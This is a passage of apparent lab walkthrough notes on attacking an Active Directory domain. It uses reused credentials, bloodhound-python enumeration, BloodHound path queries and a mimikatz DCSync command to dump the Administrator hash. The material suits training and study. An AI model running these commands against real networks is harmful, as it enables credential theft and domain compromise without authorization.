because we already have creds from the last box
`sandra:Password1234!`

we use bloodhound.py found here:
https://github.com/fox-it/BloodHound.py

must run
```bash
sudo bloodhound-python -d megacorp.local -u sandra -p "Password1234!" -gc pathfinder.megacorp.local -c all -ns 10.10.10.30
```

This will save json files to your current dir

---

Start Bloodhound

start neo4j first
`neo4j start`
start bloodhound
`bloodhound`

you can drop the .json files from earlier into the gui

---

**Common analysis queries in Bloodhound:**
	- Find all Domain Admins
	- Find Shortest Path to Domain Admins
	- Find Principals with DCSync Rights

---

Here we look at Find Principals with DCSync Rights

There is a special relation with 

With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz: `lsadump::dcsync /domain:testlab.local /user:Administrator`

